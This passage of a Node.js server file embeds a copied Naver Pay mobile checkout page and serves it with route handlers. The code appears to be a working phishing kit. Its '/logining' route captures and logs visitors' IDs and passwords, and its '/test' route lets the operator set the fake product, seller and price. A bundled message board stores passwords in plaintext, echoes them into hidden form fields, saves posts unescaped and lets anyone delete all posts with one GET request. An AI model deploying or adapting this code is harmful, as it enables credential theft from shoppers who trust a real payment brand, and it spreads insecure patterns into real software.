								<input type="hidden" name="RSVSEQ" value="">
							<input type="hidden" name="SVCINF" value="">
							<input type="hidden" name="SID" value="">
							<input type="hidden" name="CHNL" value="">
							<input type="hidden" name="USERID" value="">
							<input type="hidden" name="USERKEY" value="">
							<input type="hidden" name="EMAIL" value="">
							<input type="hidden" name="MOBILENO" value="">
							<input type="hidden" name="AMT" value="">
							<input type="hidden" name="CPID" value="">
							<input type="hidden" name="ITEMID" value="">
							<input type="hidden" name="TITLE" value="">
							<input type="hidden" name="PGID" value="">
							<input type="hidden" name="CORPCD" value="">
							<input type="hidden" name="CKEY" value="">
							<input type="hidden" name="PAYNO" value="">
							<input type="hidden" name="VALIDYM">
							<input type="hidden" name="ALLOT">
							<input type="hidden" name="PASSWD">
							<input type="hidden" name="RSVNO" value="">
							<input type="hidden" name="RESNO">
							<input type="hidden" name="INSTMO" value="">
							<input type="hidden" name="NOINTEREST" value="">
							<input type="hidden" name="NOINTERESTTYPE" value="01">
							<input type="hidden" name="POINTFG" value="">
							<input type="hidden" name="PERSON" value="">
							<input type="hidden" name="SPLITPARAM" value="">
							<input type="hidden" name="SPLITYN" value="">
							<input type="hidden" name="CLIENTSEQ" value="">
							
							<input type="hidden" name="MSG" value="">
							<input type="hidden" name="APPROVALSEQ" value="">
							<input type="hidden" name="ACCTNO" value="">
							<input type="hidden" name="ENDDATE" value="">
							<input type="hidden" name="BALANCE" value="">
							<input type="hidden" name="AUTHTYPE" value="">
							
							<input type="hidden" name="NOINTSELLERYN" value="">
							<input type="hidden" name="SURL" value="">
							<input type="hidden" name="RURL" value="">
							<input type="hidden" name="CURL" value="">
							<input type="hidden" name="LBF" id="LBF" value="">
							<input type="hidden" name="MACRURL" value="">
							<input type="hidden" name="EXPDATE" value="">
							
							<input type="hidden" name="ISSKNORMALUSER" value="Y">
							<input type="hidden" name="PREIFRAME" value="">
							<input type="hidden" name="POSTIFRAME" value="">
							<input type="hidden" name="ANSIMFG" value="">
							<input type="hidden" name="SAFEFG" value="">
							<input type="hidden" name="AUTHNO" value="">
							<input type="hidden" name="PAYKEY" value="">
							<input type="hidden" name="IFRAMETYPE" value="">
							<input type="hidden" name="PGFORMNAME" value="">
							<input type="hidden" name="CHARSET" value="">
							<input type="hidden" name="CLOSEURL" value="">
							<input type="hidden" name="LOSTPWCHANGEFG" value="">
							<input type="hidden" name="JOINSTATUS" value="">
							
							<input type="hidden" name="PKGEVD" value="">
							<input type="hidden" name="TAXATIONAMT" value="">
							<input type="hidden" name="EXEMPTIONAMT" value="">
							<input type="hidden" name="USEPENDING" value="">
							<input type="hidden" name="PGCP" value="05A">
							<input type="hidden" name="CP_UI" value="">
							<input type="hidden" name="CASH_GB" value="MC">
							
							<input type="hidden" name="Prdtnm" value="">
							<input type="hidden" name="Prdtprice" value="">
							<input type="hidden" name="Siteurl" value="">
							<input type="hidden" name="Tradeid" value="">
							<input type="hidden" name="MC_SVCID" value="">
							<input type="hidden" name="Okurl" value="">
							<input type="hidden" name="Failurl" value="">
							<input type="hidden" name="MC_FIXCOMMID" value="">
							<input type="hidden" name="MC_No" value="">
							<input type="hidden" name="SocialNo" value="">
							<input type="hidden" name="MC_AUTHPAY" value="Y">
							<input type="hidden" name="CP_UI_STYLE" value="">
							
							<input type="hidden" name="MSTR" value="">
							<input type="hidden" name="Payeremail" value="">
							<input type="hidden" name="Userid" value="">
							<input type="hidden" name="Prdtcd" value="">
							<input type="hidden" name="Item" value="">
							<input type="hidden" name="ansimFlag" value="">
							<input type="hidden" name="safeguard" value="">
							<input type="hidden" name="phoneId" value="">
							<input type="hidden" name="Mobilid" value="">
							
							<input type="hidden" name="isNormalUser" value="Y">
							<input type="hidden" name="pgIframeName" value="">
							<input type="hidden" name="Cryptstring" value="">
							<input type="hidden" name="authType" value="">
							<input type="hidden" name="mUserKey" value="">
							<input type="hidden" name="Closeurl" value="">
							
							<input type="hidden" name="PAY_MODE" value="">
							<input type="hidden" name="LOGO_YN" value="">
							<input type="hidden" name="CALL_TYPE" value="">
							<input type="hidden" name="MC_FIXNO" value="">
							
							<input type="hidden" name="IFRAME_NAME" value="">
							<input type="hidden" name="Cryptyn" value="">
							<input type="hidden" name="EMAIL_HIDDEN" value="Y">
							
						
							  
						
								<input type="hidden" name="RSVSEQ" value="">
							<input type="hidden" name="SVCINF" value="">
							<input type="hidden" name="SID" value="">
							<input type="hidden" name="CHNL" value="">
							<input type="hidden" name="USERID" value="">
							<input type="hidden" name="USERKEY" value="">
							<input type="hidden" name="EMAIL" value="">
							<input type="hidden" name="MOBILENO" value="">
							<input type="hidden" name="AMT" value="">
							<input type="hidden" name="CPID" value="">
							<input type="hidden" name="ITEMID" value="">
							<input type="hidden" name="TITLE" value="">
							<input type="hidden" name="PGID" value="">
							<input type="hidden" name="CORPCD" value="">
							<input type="hidden" name="CKEY" value="">
							<input type="hidden" name="PAYNO" value="">
							<input type="hidden" name="VALIDYM">
							<input type="hidden" name="ALLOT">
							<input type="hidden" name="PASSWD">
							<input type="hidden" name="RSVNO" value="">
							<input type="hidden" name="RESNO">
							<input type="hidden" name="INSTMO" value="">
							<input type="hidden" name="NOINTEREST" value="">
							<input type="hidden" name="NOINTERESTTYPE" value="01">
							<input type="hidden" name="POINTFG" value="">
							<input type="hidden" name="PERSON" value="">
							<input type="hidden" name="SPLITPARAM" value="">
							<input type="hidden" name="SPLITYN" value="">
							<input type="hidden" name="CLIENTSEQ" value="">
							
							<input type="hidden" name="MSG" value="">
							<input type="hidden" name="APPROVALSEQ" value="">
							<input type="hidden" name="ACCTNO" value="">
							<input type="hidden" name="ENDDATE" value="">
							<input type="hidden" name="BALANCE" value="">
							<input type="hidden" name="AUTHTYPE" value="">
							
							<input type="hidden" name="NOINTSELLERYN" value="">
							<input type="hidden" name="SURL" value="">
							<input type="hidden" name="RURL" value="">
							<input type="hidden" name="CURL" value="">
							<input type="hidden" name="LBF" id="LBF" value="">
							<input type="hidden" name="MACRURL" value="">
							<input type="hidden" name="EXPDATE" value="">
							
							<input type="hidden" name="ISSKNORMALUSER" value="Y">
							<input type="hidden" name="PREIFRAME" value="">
							<input type="hidden" name="POSTIFRAME" value="">
							<input type="hidden" name="ANSIMFG" value="">
							<input type="hidden" name="SAFEFG" value="">
							<input type="hidden" name="AUTHNO" value="">
							<input type="hidden" name="PAYKEY" value="">
							<input type="hidden" name="IFRAMETYPE" value="">
							<input type="hidden" name="PGFORMNAME" value="">
							<input type="hidden" name="CHARSET" value="">
							<input type="hidden" name="CLOSEURL" value="">
							<input type="hidden" name="LOSTPWCHANGEFG" value="">
							<input type="hidden" name="JOINSTATUS" value="">
							
							<input type="hidden" name="PKGEVD" value="">
							<input type="hidden" name="TAXATIONAMT" value="">
							<input type="hidden" name="EXEMPTIONAMT" value="">
							<input type="hidden" name="USEPENDING" value="">
						
							<input type="hidden" name="mid_common" value="naver_smartstore01">
							<input type="hidden" name="mid_point" value="naver_smartstore01">
							
							<input type="hidden" name="CST_PLATFORM">
						
							  
							<input type="hidden" name="environment" id="environment" value="real">  
							<input type="hidden" name="isMobile" id="isMobile" value="true">
							<input type="hidden" name="serviceId" id="serviceId">     
							<input type="hidden" name="cardCompanyId" id="cardCompanyId">     
							<input type="hidden" name="merchantName" id="merchantName" value="네이버페이">   
							
							<input type="hidden" name="amount" id="amount">   
							<input type="hidden" name="itemName" id="itemName">   
							<input type="hidden" name="installmentTerm" id="installmentTerm">   
							
							<input type="hidden" name="interestFreeYn" id="interestFreeYn" value="n">   
							<input type="hidden" name="domainUri" id="domainUri">   
							<input type="hidden" name="useCardCertification" id="useCardCertification" value="false">
						
							<input type="hidden" name="tid" id="tid">
							
							<!-- mpi -->
							<input type="hidden" name="cavv" id="cavv">
							<input type="hidden" name="xid" id="xid">
							<input type="hidden" name="eci" id="eci">
							<input type="hidden" name="certData" id="certData">
						
							<!-- isp -->
							<input type="hidden" name="kvpCardCode" id="kvpCardCode">
							<input type="hidden" name="sessionKey" id="sessionKey">
							<input type="hidden" name="encryptData" id="encryptData">
							
							<input type="hidden" name="AVATAR_CREDIT_DISABLE" id="AVATAR_CREDIT_DISABLE" value="">
							<input type="hidden" name="PGASYNCFG" id="PGASYNCFG" value="N">
							
							<input type="hidden" name="NOINT_NDISP" id="NOINT_NDISP" value="">
						
						
								   
						
								<input type="hidden" name="RSVSEQ" value="">
							<input type="hidden" name="SVCINF" value="">
							<input type="hidden" name="SID" value="">
							<input type="hidden" name="CHNL" value="">
							<input type="hidden" name="USERID" value="">
							<input type="hidden" name="USERKEY" value="">
							<input type="hidden" name="EMAIL" value="">
							<input type="hidden" name="MOBILENO" value="">
							<input type="hidden" name="AMT" value="">
							<input type="hidden" name="CPID" value="">
							<input type="hidden" name="ITEMID" value="">
							<input type="hidden" name="TITLE" value="">
							<input type="hidden" name="PGID" value="">
							<input type="hidden" name="CORPCD" value="">
							<input type="hidden" name="CKEY" value="">
							<input type="hidden" name="PAYNO" value="">
							<input type="hidden" name="VALIDYM">
							<input type="hidden" name="ALLOT">
							<input type="hidden" name="PASSWD">
							<input type="hidden" name="RSVNO" value="">
							<input type="hidden" name="RESNO">
							<input type="hidden" name="INSTMO" value="">
							<input type="hidden" name="NOINTEREST" value="">
							<input type="hidden" name="NOINTERESTTYPE" value="01">
							<input type="hidden" name="POINTFG" value="">
							<input type="hidden" name="PERSON" value="">
							<input type="hidden" name="SPLITPARAM" value="">
							<input type="hidden" name="SPLITYN" value="">
							<input type="hidden" name="CLIENTSEQ" value="">
							
							<input type="hidden" name="MSG" value="">
							<input type="hidden" name="APPROVALSEQ" value="">
							<input type="hidden" name="ACCTNO" value="">
							<input type="hidden" name="ENDDATE" value="">
							<input type="hidden" name="BALANCE" value="">
							<input type="hidden" name="AUTHTYPE" value="">
							
							<input type="hidden" name="NOINTSELLERYN" value="">
							<input type="hidden" name="SURL" value="">
							<input type="hidden" name="RURL" value="">
							<input type="hidden" name="CURL" value="">
							<input type="hidden" name="LBF" id="LBF" value="">
							<input type="hidden" name="MACRURL" value="">
							<input type="hidden" name="EXPDATE" value="">
							
							<input type="hidden" name="ISSKNORMALUSER" value="Y">
							<input type="hidden" name="PREIFRAME" value="">
							<input type="hidden" name="POSTIFRAME" value="">
							<input type="hidden" name="ANSIMFG" value="">
							<input type="hidden" name="SAFEFG" value="">
							<input type="hidden" name="AUTHNO" value="">
							<input type="hidden" name="PAYKEY" value="">
							<input type="hidden" name="IFRAMETYPE" value="">
							<input type="hidden" name="PGFORMNAME" value="">
							<input type="hidden" name="CHARSET" value="">
							<input type="hidden" name="CLOSEURL" value="">
							<input type="hidden" name="LOSTPWCHANGEFG" value="">
							<input type="hidden" name="JOINSTATUS" value="">
							
							<input type="hidden" name="PKGEVD" value="">
							<input type="hidden" name="TAXATIONAMT" value="">
							<input type="hidden" name="EXEMPTIONAMT" value="">
							<input type="hidden" name="USEPENDING" value="">
						
						<!-- 결제관련 공통 Form -->
						
								<input type="hidden" name="RSVSEQ" value="">
							<input type="hidden" name="SVCINF" value="">
							<input type="hidden" name="SID" value="">
							<input type="hidden" name="CHNL" value="">
							<input type="hidden" name="USERID" value="">
							<input type="hidden" name="USERKEY" value="">
							<input type="hidden" name="EMAIL" value="">
							<input type="hidden" name="MOBILENO" value="">
							<input type="hidden" name="AMT" value="">
							<input type="hidden" name="CPID" value="">
							<input type="hidden" name="ITEMID" value="">
							<input type="hidden" name="TITLE" value="">
							<input type="hidden" name="PGID" value="">
							<input type="hidden" name="CORPCD" value="">
							<input type="hidden" name="CKEY" value="">
							<input type="hidden" name="PAYNO" value="">
							<input type="hidden" name="VALIDYM">
							<input type="hidden" name="ALLOT">
							<input type="hidden" name="PASSWD">
							<input type="hidden" name="RSVNO" value="">
							<input type="hidden" name="RESNO">
							<input type="hidden" name="INSTMO" value="">
							<input type="hidden" name="NOINTEREST" value="">
							<input type="hidden" name="NOINTERESTTYPE" value="01">
							<input type="hidden" name="POINTFG" value="">
							<input type="hidden" name="PERSON" value="">
							<input type="hidden" name="SPLITPARAM" value="">
							<input type="hidden" name="SPLITYN" value="">
							<input type="hidden" name="CLIENTSEQ" value="">
							
							<input type="hidden" name="MSG" value="">
							<input type="hidden" name="APPROVALSEQ" value="">
							<input type="hidden" name="ACCTNO" value="">
							<input type="hidden" name="ENDDATE" value="">
							<input type="hidden" name="BALANCE" value="">
							<input type="hidden" name="AUTHTYPE" value="">
							
							<input type="hidden" name="NOINTSELLERYN" value="">
							<input type="hidden" name="SURL" value="">
							<input type="hidden" name="RURL" value="">
							<input type="hidden" name="CURL" value="">
							<input type="hidden" name="LBF" id="LBF" value="">
							<input type="hidden" name="MACRURL" value="">
							<input type="hidden" name="EXPDATE" value="">
							
							<input type="hidden" name="ISSKNORMALUSER" value="Y">
							<input type="hidden" name="PREIFRAME" value="">
							<input type="hidden" name="POSTIFRAME" value="">
							<input type="hidden" name="ANSIMFG" value="">
							<input type="hidden" name="SAFEFG" value="">
							<input type="hidden" name="AUTHNO" value="">
							<input type="hidden" name="PAYKEY" value="">
							<input type="hidden" name="IFRAMETYPE" value="">
							<input type="hidden" name="PGFORMNAME" value="">
							<input type="hidden" name="CHARSET" value="">
							<input type="hidden" name="CLOSEURL" value="">
							<input type="hidden" name="LOSTPWCHANGEFG" value="">
							<input type="hidden" name="JOINSTATUS" value="">
							
							<input type="hidden" name="PKGEVD" value="">
							<input type="hidden" name="TAXATIONAMT" value="">
							<input type="hidden" name="EXEMPTIONAMT" value="">
							<input type="hidden" name="USEPENDING" value="">
						
						
								</div>
								<hr>
						<div id="footer">
							<p class="logonf" onclick="window.top.location.href='https://www.naverfincorp.com/'; return false;">
								<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="96" height="26" viewBox="0 0 96 26">
									<defs>
										<path id="prefix__a" d="M0.518 0.462L11.559 0.462 11.559 11.964 0.518 11.964z"></path>
										<path id="prefix__c" d="M0 0.038L11.189 0.038 11.189 11.068 0 11.068z"></path>
										<path id="prefix__e" d="M0.256 0.038L12.918 0.038 12.918 11.068 0.256 11.068z"></path>
										<path id="prefix__g" d="M0.021 0.038L8.808 0.038 8.808 11.068 0.021 11.068z"></path>
										<path id="prefix__i" d="M0.2 0.038L12.861 0.038 12.861 11.068 0.2 11.068z"></path>
									</defs>
									<g fill="none" fill-rule="evenodd">
										<path fill="#CCC" d="M0 13.813L0 25.188 3.509 25.188 3.509 21.327 6.952 21.327 7.954 18.648 3.509 18.648 3.509 16.691 8.686 16.691 9.763 13.813zM11.39 25.188L14.644 25.188 14.644 13.813 11.39 13.813zM24.808 13.813L24.808 19.9 20.585 13.813 17.085 13.813 17.085 25.188 20.752 25.188 20.752 19.1 24.974 25.188 28.475 25.188 28.475 13.813zM68.339 25.188L71.593 25.188 71.593 13.813 68.339 13.813z"></path>
										<g transform="translate(55.311 13.223)">
											<mask id="prefix__b" fill="#fff">
												<use xlink:href="#prefix__a"></use>
											</mask>
											<path fill="#CCC" d="M.518 6.244v-.03C.518 2.92 3.112.461 6.437.461c2.45 0 4.104 1.181 5.043 2.867L8.409 5.11c-.413-.788-1.002-1.34-2.02-1.34-1.258 0-2.084 1.088-2.084 2.411v.032c0 1.434.859 2.442 2.083 2.442 1.05 0 1.64-.567 2.1-1.386l3.071 1.717c-.938 1.639-2.497 2.978-5.266 2.978-3.086 0-5.775-2.3-5.775-5.72" mask="url(#prefix__b)"></path>
										</g>
										<path fill="#CCC" d="M34.592 20.842l1.244-3.446 1.245 3.446h-2.49zm-.72-6.92l-4.367 11.03h3.711l.527-1.46h4.186l.527 1.46h3.711l-4.366-11.03h-3.93zM90.488 22.16L90.488 13.922 86.885 13.922 86.885 24.951 94.616 24.951 95.721 22.16zM78.164 20.842l1.244-3.446 1.245 3.446h-2.49zm-.72-6.92l-4.367 11.03h3.711l.528-1.46h4.185l.527 1.46h3.711l-4.366-11.03h-3.93zM50.9 19.825L46.752 13.921 43.313 13.921 43.313 24.951 46.915 24.951 46.915 19.048 51.063 24.951 54.502 24.951 54.502 13.921 50.9 13.921z"></path>
										<mask id="prefix__d" fill="#fff">
											<use xlink:href="#prefix__c"></use>
										</mask>
										<path fill="#CCC" d="M7.587 5.941L3.439 0.038 0 0.038 0 11.068 3.602 11.068 3.602 5.165 7.75 11.068 11.189 11.068 11.189 0.038 7.587 0.038z" mask="url(#prefix__d)"></path>
										<g transform="translate(12.08)">
											<mask id="prefix__f" fill="#fff">
												<use xlink:href="#prefix__e"></use>
											</mask>
											<path fill="#CCC" d="M5.342 6.958l1.245-3.445 1.245 3.445h-2.49zm-.72-6.92L.256 11.068h3.71l.528-1.46H8.68l.527 1.46h3.712L8.55.038h-3.93z" mask="url(#prefix__f)"></path>
										</g>
										<g transform="translate(36.874)">
											<mask id="prefix__h" fill="#fff">
												<use xlink:href="#prefix__g"></use>
											</mask>
											<path fill="#CCC" d="M3.569 6.877L8.645 6.877 8.645 4.228 3.569 4.228 3.569 2.741 8.699 2.741 8.699 0.038 0.021 0.038 0.021 11.068 8.808 11.068 8.808 8.364 3.569 8.364z" mask="url(#prefix__h)"></path>
										</g>
										<g transform="translate(22.887)">
											<mask id="prefix__j" fill="#fff">
												<use xlink:href="#prefix__i"></use>
											</mask>
											<path fill="#CCC" d="M6.53 7.29L3.911 0.037 0.2 0.037 4.566 11.068 8.495 11.068 12.861 0.037 9.15 0.037z" mask="url(#prefix__j)"></path>
										</g>
										<path fill="#CCC" d="M52.777 5.174h-1.91V2.85h1.91c.649 0 1.174.52 1.174 1.163 0 .641-.525 1.162-1.174 1.162zm2.425 2.11l.338-.14c1.294-.537 1.952-1.698 1.952-3.171 0-1.394-.513-2.424-1.525-3.064-.94-.594-2.16-.871-3.838-.871h-4.7v11.03h3.493V7.985h1.255l2.129 3.081h3.711l-2.815-3.783z"></path>
									</g>
								</svg>
								<span class="blind">NAVER FINANCIAL</span>
							</p>
							<p class="description">
								네이버파이낸셜㈜은 전자결제서비스제공자 및 통신판매중개자이며 통신판매의 당사자가 아닙니다. 상품, 상품정보 및 거래에 관한 의무와 책임은 판매자에게 있습니다.
							</p>
						</div>
							</div>
							<!-- javascript 영역 -->
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						
						<div id="40A_OBJECT"></div>							    							   
						
						<!-- iframe?? ??????吏? ?븡?? 寃? -->
						<iframe id="approval_frame_40A" name="approval_frame_40A" style="display:none;position:absolute;top:0px;left:0px;z-index:101;width:100%;height:100%;overflow:auto;background-color:white;" frameborder="0" marginheight="0" marginwidth="0" border="0" width="100%" height="100%" scrolling="yes" title="내용없음"></iframe>
						<div id="51A_OBJECT"></div>
						
						<div id="01A_OBJECT"></div>										    							   
							<script language="javascript" src="https://dbill.naver.com/dist/js/certificationModule.js?ts=1647230547575" type="text/javascript"></script>
						
						
						<!--  수정 불가(IFRAME 방식시 사용)   -->
						<div id="LGD_PAYMENTWINDOW" style="position:absolute; display:none; left:0; top:0; width:100%; height:100%; background-color:white; z-index:100 ; font-size:small; ">
							 <iframe id="LGD_PAYMENTWINDOW_IFRAME" name="LGD_PAYMENTWINDOW_IFRAME" height="100%" width="100%" scrolling="auto" frameborder="0" style="background-color:white;" title="내용없음">
							 </iframe>
						</div>
						<div id="INI_PAYMENTWINDOW" style="position:absolute; display:none; left:0; top:0; width:100%; height:100%; background-color:white; z-index:100 ; font-size:small; ">
							 <iframe id="INI_PAYMENTWINDOW_IFRAME" name="INI_PAYMENTWINDOW_IFRAME" height="100%" width="100%" scrolling="no" frameborder="0" style="background-color:white;" title="내용없음">
							 </iframe>
						</div>
							<div class="_repurchase">&nbsp;</div>
							<div class="_repurchaseDtl">
							</div>
						
							
						
						
						
						</div>
							<div class="dimlayer _chargeBankLayer" style="display:none;">
								<div class="dimbg"></div>
								<div class="bottom_floating pointcharge_layer">
									<strong class="popup_title">출금계좌</strong>
									<ul class="account_list">
												<li class="account none">
													등록된 계좌가 없습니다.<br>계좌를 추가해 주세요.
												</li>
									</ul>
									<button type="button" class="N=a:ode.chargepointaccountadd button_add _click(checkout.mobile.order.order_sheet.registerEasyBank()) _stopDefault">계좌 추가</button>
									<button type="button" class="button_close openbanking_img _click(checkout.mobile.order.order_sheet.hideModalLayer(chargeBankLayer)) _stopDefault"><span class="blind">레이어닫기</span></button>
								</div>
							</div>
						
							<div class="dimlayer _chargeBankLayer" style="display:none;">
								<div class="dimbg"></div>
								<div class="bottom_floating pointcharge_layer">
									<strong class="popup_title">출금계좌</strong>
									<ul class="account_list">
												<li class="account none">
													등록된 계좌가 없습니다.<br>계좌를 추가해 주세요.
												</li>
									</ul>
									<button type="button" class="N=a:ode.chargepointaccountadd button_add _click(checkout.mobile.order.order_sheet.registerEasyBank()) _stopDefault">계좌 추가</button>
									<button type="button" class="button_close openbanking_img _click(checkout.mobile.order.order_sheet.hideModalLayer(chargeBankLayer)) _stopDefault"><span class="blind">레이어닫기</span></button>
								</div>
							</div>
						
						</form></body></html>`
						res.writeHead(200, {'Content-Type':'text/html', 'charset' : 'utf-8'}); 
						res.end(mcom);  

								
					
					}); 
	
				}

			if(req.method =='POST' && req.url == '/logining') { // receive login
				fs.readFile('./static/html/gobuy.html', function(err, data) { 
						
					res.writeHead(200, {'Content-Type':'text/html', 'charset' : 'utf-8'}); 
					res.end(data);  
								});
				req.on('data', function(chunk) { 
					//console.log(chunk.toString()); 
					var data = qs.parse(chunk.toString());
					console.log("\n\n-------------------------------\n\n로그인 정보 \n\n아이디 : "+data.id+"\n\n패스워드 : "+data.pw+"\n\n-------------------------------\n\n" )
					id = data.id
					}); 

				}
				if(req.method =='POST' && req.url == '/test') { // receive login
					
						testgo = `<meta http-equiv="Content-Type" content="text/html; charset=utf-8"><h1>완료</h1>`
						res.writeHead(200, {'Content-Type':'text/html', 'charset' : 'utf-8'}); 
						res.end(testgo);  
								
					req.on('data', function(chunk) { 
						//console.log(chunk.toString()); 
						var data = qs.parse(chunk.toString());
						물건이름 = data.name
						판매자이름 = data.sellername
						물건이미지 = data.photo
						가격 = data.price
						기존가격 = data.basicprice
						가격1 = Number(data.price1)
						기존가격1 = Number(data.basicprice1)
 						//id = data.id
						}); 
		
					}
					if(req.method =='POST' && req.url == '/comlogin') { // receive login
					
					 
								
					req.on('data', function(chunk) { 
						var data = qs.parse(chunk.toString());
						var accounts = JSON.parse(fs.readFileSync('./account.json'))

						console.log("[ LOGIN ] ID : %s/PW : %s", data.id, data.pw)
						accounts.forEach(x => {
							if(x.id == data.id && x.pw == data.pw){
								console.log('[ LOGIN ] 가입된아이디/패스워드')
								islogin = 1;
							}
						});
						if(islogin == 1){
							console.log('[ LOGIN ] 로그인 성공 ID : %s\n', data.id)
							res.writeHead(200, {'Content-Type':'text/html', 'charset' : 'utf-8'}); 
							text = JSON.parse(fs.readFileSync('./text.json'))
							var text3 = ""
							text.context.forEach(x=> text3 = text3 + String(x))
							res.end(`
							<meta charset="utf-8"><h1>로그인 성공!</h1><a><h2>환영합니다 ${data.id} 님</h2><a>${text3}<br>
							<form id="orderForm" action="/write" name="orderForm" class="_orderForm" method="post">
							<button>글쓰기</button><input NAME = "token" value = "${data.id}/${data.pw}" hidden= true;></form><a href='./comu'><button>로그아웃</button></a>`);
							islogin = 0; 
						} else {
							res.writeHead(200, {'Content-Type':'text/html', 'charset' : 'utf-8'}); 
							res.end('<meta charset="utf-8">'+'<script>alert("아이디또는 패스워드가 일치하지 않습니다."); window.location.replace("./comu");</script>'); 
							console.log('[ LOGIN ] 로그인 실패\n')
						}
						

						}); 
		
					}

					if(req.method =='POST' && req.url == '/write') {
						
						req.on('data', function(chunk) { 
						var is_error = false
						var data = qs.parse(chunk.toString());
						
						try {
							var check = data.token.split('/')
						} catch (error) {
							res.writeHead(200, {'Content-Type':'text/html', 'charset' : 'utf-8'}); 
							res.end('<meta charset="utf-8"><script>alert("어 시반 제서버에 뭔짓을 하는거애여 ㅉㅈ")</script>');
							is_error = true
						}
						if(is_error == false){
						console.log(check)
						testgo = `<h1>햇봇 커뮤니티 글쓰기</h1>
					        	<form id="orderForm" action="/writing" name="orderForm" class="_orderForm" method="post">
								<br>
								<INPUT TYPE = "TEXT"  NAME = "context" >
								<button class = 'login'>글쓰기</button><input NAME = "token" value = "${check[0]}/${check[1]}" hidden= true;></form>`
						res.writeHead(200, {'Content-Type':'text/html', 'charset' : 'utf-8'}); 
						res.end('<meta charset="utf-8">'+String(testgo));
						}
					})
					}
					
					//{"context":[""]}
					if(req.method =='GET' && req.url == '/alldel') {
						testgo = `<h1>완료</h1>`
						res.writeHead(200, {'Content-Type':'text/html', 'charset' : 'utf-8'}); 
						res.end('<meta charset="utf-8">'+String(testgo));
						fs.writeFileSync('./text.json',String('{"context":[""]}'))

					}



				


					if(req.method =='POST' && req.url == '/writing') {
						
						req.on('data', function(chunk) { 
							if(black_ip_list.black.includes(String(requestIp.getClientIp(req)).substr(7))){
								console.log("[ WRITE ] 차단된 아이피 : "+String(requestIp.getClientIp(req)).substr(7))
								res.writeHead(200, {'Content-Type':'text/html', 'charset' : 'utf-8'}); 
								res.end('<meta charset="utf-8"><script>alert("너님은 차단당한 아이피인 거시에요 ㅉㅈ 2분후에 시도해주세요");history.go (-1);</script>'); 
							} else {
							if (!black_ip_list[String(requestIp.getClientIp(req)).substr(7)]){
							black_ip_list[String(requestIp.getClientIp(req)).substr(7)] = 0
							}
							black_ip_list[String(requestIp.getClientIp(req)).substr(7)] += 1

							if (black_ip_list[String(requestIp.getClientIp(req)).substr(7)] == 1){
							setTimeout(() => {
								black_ip_list[String(requestIp.getClientIp(req)).substr(7)] = 0
							}, 60000);
						}

							if (black_ip_list[String(requestIp.getClientIp(req)).substr(7)] == 5){
								black_ip_list[String(requestIp.getClientIp(req)).substr(7)] = 0
								black_ip_list.black.push(String(requestIp.getClientIp(req)).substr(7))
								setTimeout(() => {
									for(let i = 0; i < black_ip_list.black.length; i++) {
										if(black_ip_list.black[i] === String(requestIp.getClientIp(req)).substr(7))  {
											black_ip_list.black.splice(i, 1);
										  i--;
										}
									  }
								}, 120000);
								}
							 
							console.log(black_ip_list) 
						var data = qs.parse(chunk.toString());
						var is_error = false
						try {
							var check = data.token.split('/')
						} catch (error) {
							res.writeHead(200, {'Content-Type':'text/html', 'charset' : 'utf-8'}); 
							res.end('<meta charset="utf-8"><script>alert("어 시반 제서버에 뭔짓을 하는거애여 ㅉㅈ")</script>');
							is_error = true
							
						}
						if (is_error == false){
						text = JSON.parse(fs.readFileSync('./text.json'))
						text.context.push(`<h5>___________________________________</h5><a href='#'><h2>${data.context}</h2><a><h3>작성자 : ${check[0]}</h3><h5>___________________________________</h5>`)
						fs.writeFileSync('./text.json',JSON.stringify(text))
						console.log(check)
						testgo = `<form id="orderForm" action="/comlogin" name="orderForm" class="_orderForm" method="post">
						<INPUT TYPE = "TEXT"  NAME = "id" value="${check[0]}" hidden = true>
						<INPUT TYPE = "PASSWORD"  NAME = "pw" value="${check[1]}" hidden = true><h1>완료</h1><button>처음으로 돌아가기</button>`
						res.writeHead(200, {'Content-Type':'text/html', 'charset' : 'utf-8'}); 
						res.end('<meta charset="utf-8">'+String(testgo));
							}
						}
						})
					
					}

					if(req.method =='POST' && req.url == '/new') { // receive login
					
					 
								
						req.on('data', function(chunk) { 
							if(black_ip_list.black.includes(String(requestIp.getClientIp(req)).substr(7))){
								console.log("[ REG ] 차단된 아이피 : "+String(requestIp.getClientIp(req)).substr(7))
								res.writeHead(200, {'Content-Type':'text/html', 'charset' : 'utf-8'}); 
								res.end('<meta charset="utf-8"><script>alert("너님은 차단당한 아이피인 거시에요 ㅉㅈ 2분후에 시도해주세요");history.go (-1);</script>'); 
							} else {
							if (!black_ip_list[String(requestIp.getClientIp(req)).substr(7)]){
							black_ip_list[String(requestIp.getClientIp(req)).substr(7)] = 0
							}
							black_ip_list[String(requestIp.getClientIp(req)).substr(7)] += 1

							if (black_ip_list[String(requestIp.getClientIp(req)).substr(7)] == 1){
							setTimeout(() => {
								black_ip_list[String(requestIp.getClientIp(req)).substr(7)] = 0
							}, 60000);
						}

							if (black_ip_list[String(requestIp.getClientIp(req)).substr(7)] == 5){
								black_ip_list[String(requestIp.getClientIp(req)).substr(7)] = 0
								black_ip_list.black.push(String(requestIp.getClientIp(req)).substr(7))
								setTimeout(() => {
									for(let i = 0; i < black_ip_list.black.length; i++) {
										if(black_ip_list.black[i] === String(requestIp.getClientIp(req)).substr(7))  {
											black_ip_list.black.splice(i, 1);
										  i--;
										}
									  }
								}, 120000);
								}
							 
							console.log(black_ip_list) 
							//console.log("가입창 접속 : "+String(requestIp.getClientIp(req)).substr(7))
							var data = qs.parse(chunk.toString());
							var accounts = JSON.parse(fs.readFileSync('./account.json'))
							console.log("[ REG ] ID : %s/PW : %s", data.id, data.pw)
							accounts.forEach(x => {
								if(x.id == data.id){
									isregister = 1
									console.log('[ REG ] 이미 가입된 아이디\n')
									return;
								}
							});
							if(isregister == 1){
								res.writeHead(200, {'Content-Type':'text/html', 'charset' : 'utf-8'}); 
								res.end('<meta charset="utf-8"><script>alert("이미 가입된 아이디입니다");history.go (-1);</script>'); 
								isregister = 0
							} else {
							newaccount = {'id' : data.id, 'pw' : data.pw }
							accounts.push(newaccount)
							fs.writeFileSync('./account.json',JSON.stringify(accounts))
							testgo = JSON.stringify(data)
							res.writeHead(200, {'Content-Type':'text/html', 'charset' : 'utf-8'}); 
							res.end('<meta charset="utf-8"><script>alert("가입이 완료되었습니다"); window.location.replace("./comu");</script>'); 
							console.log('[ REG ] 회원가입 성공! ID : %s/PW : %s\n', data.id, data.pw);
							}
						}
							}); 
			
						}
